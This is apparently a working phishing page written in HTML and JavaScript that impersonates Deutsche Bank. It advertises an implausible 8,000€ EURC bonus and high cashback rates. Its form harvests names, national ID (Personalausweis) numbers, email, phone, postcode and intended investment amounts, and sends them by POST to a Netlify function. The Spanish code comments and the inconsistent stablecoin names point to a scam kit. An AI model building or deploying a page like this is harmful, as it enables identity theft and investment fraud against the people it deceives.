<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deutsche Bank - Digital Festgeld</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html, body {
            width: 100%;
            height: 100%;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #ffffff;
        }
        
        .email-wrapper {
            max-width: 1000px;
            margin: 0 auto;
            background-color: #ffffff;
            display: flex;
            min-height: 100vh;
        }
        
        /* Left Section - Blue Background */
        .left-section {
            background: linear-gradient(135deg, #00008B 0%, #0000CD 100%);
            color: #ffffff;
            padding: 60px 40px;
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-width: 45%;
        }
        
        .logo-section {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 40px;
        }
        
        .logo {
            width: 40px;
            height: 40px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #ffffff;
        }
        
        .main-title {
            font-size: 42px;
            font-weight: 300;
            line-height: 1.3;
            margin-bottom: 30px;
            color: #ffffff;
        }
        
        .bonus-label {
            font-size: 14px;
            color: #ffd000;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .bonus-amount {
            font-size: 72px;
            font-weight: 300;
            color: #ffd000;
            margin-bottom: 10px;
            letter-spacing: -2px;
        }
        
        .bonus-description {
            font-size: 16px;
            color: #ffffff;
            margin-bottom: 25px;
        }
        
        .cashback-items {
            background-color: rgba(255, 255, 255, 0.05);
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 30px;
        }
        
        .cashback-item {
            font-size: 14px;
            color: #ffffff;
            margin: 8px 0;
            padding-left: 20px;
            position: relative;
        }
        
        .cashback-item:before {
            content: "→";
            position: absolute;
            left: 0;
            color: #ffd000;
            font-weight: bold;
        }
        
        .bottom-text {
            font-size: 14px;
            color: #ffffff;
            line-height: 1.6;
            margin-top: auto;
        }
        
        .bottom-text strong {
            color: #ffd000;
        }
        
        /* Right Section - White Background Form */
        .right-section {
            flex: 1;
            padding: 60px 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background-color: #ffffff;
            min-width: 55%;
        }
        
        .form-header {
            margin-bottom: 10px;
        }
        
        .form-title {
            font-size: 28px;
            color: #00008B;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .form-subtitle {
            font-size: 14px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .security-box {
            background-color: #f0f4ff;
            border-left: 4px solid #00008B;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 4px;
        }
        
        .security-title {
            color: #00008B;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .security-item {
            font-size: 13px;
            color: #333;
            margin: 8px 0;
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }
        
        .security-item:before {
            content: "✓";
            color: #4caf50;
            font-weight: bold;
            flex-shrink: 0;
        }
        
        .security-item strong {
            font-weight: 600;
            color: #00008B;
        }
        
        .form-group {
            margin-bottom: 18px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 6px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-group label .required {
            color: #d32f2f;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            font-family: inherit;
            background-color: #f9f9f9;
            transition: all 0.3s ease;
        }
        
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #00008B;
            background-color: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 0, 139, 0.1);
        }
        
        .form-group input::placeholder {
            color: #999;
        }
        
        .form-group select {
            background-color: #f9f9f9;
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23333' d='M6 9L1 4h10z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 12px center;
            padding-right: 36px;
        }
        
        .alert {
            padding: 12px 15px;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 13px;
            display: none;
        }
        
        .alert.success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .submit-btn {
            background: linear-gradient(135deg, #00008B 0%, #0000CD 100%);
            color: #ffffff;
            padding: 14px 30px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            margin-top: 15px;
        }
        
        .submit-btn:hover {
            opacity: 0.9;
        }
        
        .submit-btn:active {
            transform: scale(0.98);
        }
        
        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            opacity: 0.7;
        }
        
        .bottom-note {
            font-size: 12px;
            color: #999;
            margin-top: 15px;
            text-align: center;
        }
        
        @media (max-width: 900px) {
            .email-wrapper {
                flex-direction: column;
                min-height: auto;
            }
            
            .left-section {
                min-width: 100%;
                padding: 40px 30px;
            }
            
            .right-section {
                min-width: 100%;
                padding: 40px 30px;
            }
            
            .main-title {
                font-size: 32px;
            }
            
            .bonus-amount {
                font-size: 52px;
            }
            
            .form-title {
                font-size: 24px;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="email-wrapper">
        <!-- Left Section -->
        <div class="left-section">
            <div>
                <div class="logo-section">
                    <div class="logo">🏦</div>
                    <div class="logo-text">Deutsche Bank</div>
                </div>
                
                <h1 class="main-title">Ihr Geld ist hier MEHR wert</h1>
                
                <div class="bonus-label">Erhalten Sie bis zu</div>
                <div class="bonus-amount">8.000€</div>
                <div class="bonus-description">Bonus in EURC</div>
                
                <div class="cashback-items">
                    <div class="cashback-item">25k: 4% + 2% Cashback</div>
                    <div class="cashback-item">50k: 5% + 2% Cashback</div>
                    <div class="cashback-item">100k: 6% + 2% Cashback</div>
                </div>
            </div>
            
            <div class="bottom-text">
                Wählen Sie, wie Sie Ihr Konto eröffnen möchten, über einen Berater oder direkt über der SMS Funktion <strong>FORMULAR ABSENDEN</strong>
            </div>
        </div>
        
        <!-- Right Section -->
        <div class="right-section">
            <div class="form-header">
                <h2 class="form-title">Konto eröffnen bei Deutsche Bank</h2>
                <p class="form-subtitle">Füllen Sie dieses Formular aus und wir werden uns unverbindlich mit Ihnen in Verbindung setzen.</p>
            </div>
            
            <div class="security-box">
                <div class="security-title">🔒 Maximale Sicherheit mit EURUA/EURC</div>
                <div class="security-item">
                    <strong>Einlagensicherung:</strong> Bis zu 100.000€ vollständig geschützt
                </div>
                <div class="security-item">
                    <strong>Betrugsschutz:</strong> Höchste Sicherheit für alle Transaktionen
                </div>
                <div class="security-item">
                    <strong>Kostenlose digitale EURC/EURAU IBAN:</strong> Ihr persönliches sicheres Konto
                </div>
                <div class="security-item">
                    <strong>Zahlungen senden & empfangen:</strong> Mit maximaler Sicherheit
                </div>
                <div class="security-item">
                    <strong>100% auf Ihren Namen:</strong> Nur Sie haben Zugriff
                </div>
                <div class="security-item">
                    <strong>Dezentrale Lösungen:</strong> Erstmalig innovative Blockchain-Technologie
                </div>
                <div class="security-item">
                    <strong>Komplett kostenlos:</strong> Keine versteckten Gebühren
                </div>
                <div style="margin-top: 15px; padding-top: 15px; border-top: 1px solid rgba(0, 0, 139, 0.1); font-size: 12px; color: #666;">
                    Ein Berater wird Sie innerhalb von 24 Stunden unverbindlich kontaktieren
                </div>
            </div>
            
            <form id="campaignForm">
                <div id="alertMessage" class="alert"></div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="vorname">Ihr Vorname <span class="required">*</span></label>
                        <input type="text" id="vorname" name="vorname" placeholder="Ihr Vorname" required>
                    </div>
                    <div class="form-group">
                        <label for="nachname">Ihr Nachname <span class="required">*</span></label>
                        <input type="text" id="nachname" name="nachname" placeholder="Ihr Nachname" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="personalausweis">Personalausweis <span class="required">*</span></label>
                    <input type="text" id="personalausweis" name="personalausweis" placeholder="Personalausweis Nummer" required>
                </div>
                
                <div class="form-group">
                    <label for="email">Email <span class="required">*</span></label>
                    <input type="email" id="email" name="email" placeholder="ihre.email@beispiel.com" required>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="telefon">Telefon <span class="required">*</span></label>
                        <input type="tel" id="telefon" name="telefon" placeholder="+49..." required>
                    </div>
                    <div class="form-group">
                        <label for="postleitzahl">Postleitzahl <span class="required">*</span></label>
                        <input type="text" id="postleitzahl" name="postleitzahl" placeholder="Postleitzahl" required>
                    </div>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label for="anlagebetrag">Anlagebetrag (€) <span class="required">*</span></label>
                        <input type="number" id="anlagebetrag" name="anlagebetrag" placeholder="10.000 - 150.000" min="10000" max="150000" required>
                    </div>
                    <div class="form-group">
                        <label for="waehrung">Währung</label>
                        <select id="waehrung" name="waehrung">
                            <option value="EURC">EURC</option>
                            <option value="EURAU">EURAU</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group" style="margin-top: 20px;">
                    <label style="display: flex; align-items: flex-start; gap: 8px; font-weight: 400; cursor: pointer;">
                        <input type="checkbox" id="autorizo" name="autorizo" required style="margin-top: 4px;">
                        <span style="font-size: 12px; color: #555;">ICH AUTORISIERE die Erhebung und Verarbeitung meiner Daten zur Verwaltung meines Antrags und zum Empfang kommerzieller Informationen, wie in der <strong>Datenschutzrichtlinie</strong> beschrieben.</span>
                    </label>
                </div>
                
                <button type="submit" class="submit-btn">FORMULAR ABSENDEN</button>
                
                <div class="bottom-note">
                    Sicher · Kostenlos · Schnell
                </div>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('campaignForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const alertDiv = document.getElementById('alertMessage');
            const submitBtn = document.querySelector('.submit-btn');
            
            try {
                // Validar que todos los campos están llenos
                const vorname = document.getElementById('vorname').value.trim();
                const nachname = document.getElementById('nachname').value.trim();
                const personalausweis = document.getElementById('personalausweis').value.trim();
                const email = document.getElementById('email').value.trim();
                const telefon = document.getElementById('telefon').value.trim();
                const postleitzahl = document.getElementById('postleitzahl').value.trim();
                const anlagebetrag = document.getElementById('anlagebetrag').value;
                const waehrung = document.getElementById('waehrung').value;
                const autorizo = document.getElementById('autorizo').checked;

                if (!vorname || !nachname || !personalausweis || !email || !telefon || !postleitzahl || !anlagebetrag || !autorizo) {
                    throw new Error('Por favor complete todos los campos y la autorización');
                }

                // Validar email
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(email)) {
                    throw new Error('Por favor ingrese un email válido');
                }

                // Mostrar estado de carga
                submitBtn.disabled = true;
                submitBtn.textContent = 'Wird gesendet...';

                // Enviar datos a la API
                const response = await fetch('/.netlify/functions/submitEmailCampaign', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        vorname,
                        nachname,
                        personalausweis,
                        email,
                        telefon,
                        postleitzahl,
                        anlagebetrag: parseFloat(anlagebetrag),
                        waehrung,
                        autorizo
                    })
                });

                const data = await response.json();

                if (response.ok) {
                    alertDiv.className = 'alert success';
                    alertDiv.textContent = '✓ Solicitud enviada exitosamente. Un asesor se contactará con usted pronto.';
                    alertDiv.style.display = 'block';
                    document.getElementById('campaignForm').reset();
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'FORMULAR ABSENDEN';
                } else {
                    throw new Error(data.message || 'Error al enviar el formulario');
                }
            } catch (error) {
                alertDiv.className = 'alert error';
                alertDiv.textContent = '✗ Error: ' + error.message;
                alertDiv.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'FORMULAR ABSENDEN';
                console.error('Form submission error:', error);
            }
        });
    </script>
</body>
</html>